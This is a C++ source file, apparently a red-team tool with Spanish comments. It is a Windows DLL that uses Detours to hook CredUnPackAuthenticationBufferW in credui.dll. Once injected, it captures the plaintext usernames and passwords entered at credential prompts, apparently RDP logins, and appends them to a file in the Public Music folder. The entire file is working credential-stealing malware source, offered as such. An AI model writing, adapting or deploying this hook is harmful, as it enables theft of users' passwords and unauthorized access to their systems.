#include <windows.h>
#include <wincred.h>
#include "pch.h"
#include <detours.h>
#include <fstream>
#include <codecvt>
#include <locale>


// Definición del puntero a la función original
typedef BOOL(WINAPI* CredUnPackAuthenticationBufferW_t)(
    DWORD       dwFlags,
    PVOID       pAuthBuffer,
    DWORD       cbAuthBuffer,
    LPWSTR      pszUserName,
    DWORD* pcchMaxUserName,
    LPWSTR      pszDomainName,
    DWORD* pcchMaxDomainName,
    LPWSTR      pszPassword,
    DWORD* pcchMaxPassword
    );

// Declaración de la función original
CredUnPackAuthenticationBufferW_t pCredUnPackAuthenticationBufferW = NULL;

// Implementación de la función hook
BOOL WINAPI MyCredUnPackAuthenticationBufferW(DWORD dwFlags, PVOID pAuthBuffer, DWORD cbAuthBuffer, LPWSTR pszUserName, DWORD* pcchMaxUserName, LPWSTR pszDomainName, DWORD* pcchMaxDomainName, LPWSTR pszPassword, DWORD* pcchMaxPassword)
{
    OutputDebugStringA("MyCredUnPackAuthenticationBufferW Hooked Function");
    // Llamada a la función original
    BOOL result = pCredUnPackAuthenticationBufferW(
        dwFlags,
        pAuthBuffer,
        cbAuthBuffer,
        pszUserName,
        pcchMaxUserName,
        pszDomainName,
        pcchMaxDomainName,
        pszPassword,
        pcchMaxPassword
    );

    // Convertir pszUserName a std::string
    std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
    std::string username = converter.to_bytes(pszUserName);

    // Convertir pszPassword a std::string
    std::string password = converter.to_bytes(pszPassword);
    
    std::ofstream file("C:\\Users\\Public\\Music\\RDPCreds.txt", std::ios_base::app);
    if (file.is_open())
    {
        file << username << ":" << password << std::endl;
        file.close();
    }

    return result;
}

// Función de inicialización del hook
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
        HMODULE hAdvapi32 = LoadLibraryA("credui.dll");
        if (hAdvapi32 != NULL) {
            pCredUnPackAuthenticationBufferW = reinterpret_cast<CredUnPackAuthenticationBufferW_t>(GetProcAddress(hAdvapi32, "CredUnPackAuthenticationBufferW"));
            if (pCredUnPackAuthenticationBufferW != NULL)
            {
                OutputDebugStringA("Installing Hooked Function");
                // Aplica el hook
                DetourTransactionBegin();
                DetourUpdateThread(GetCurrentThread());
                DetourAttach(&(PVOID&)pCredUnPackAuthenticationBufferW, MyCredUnPackAuthenticationBufferW);
                DetourTransactionCommit();
            }
            else {
                OutputDebugStringA("Error");

            }
        }
    }
    else if (ul_reason_for_call == DLL_PROCESS_DETACH)
    {
        // Deshace el hook
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)pCredUnPackAuthenticationBufferW, MyCredUnPackAuthenticationBufferW);
        DetourTransactionCommit();
    }

    return true;
} 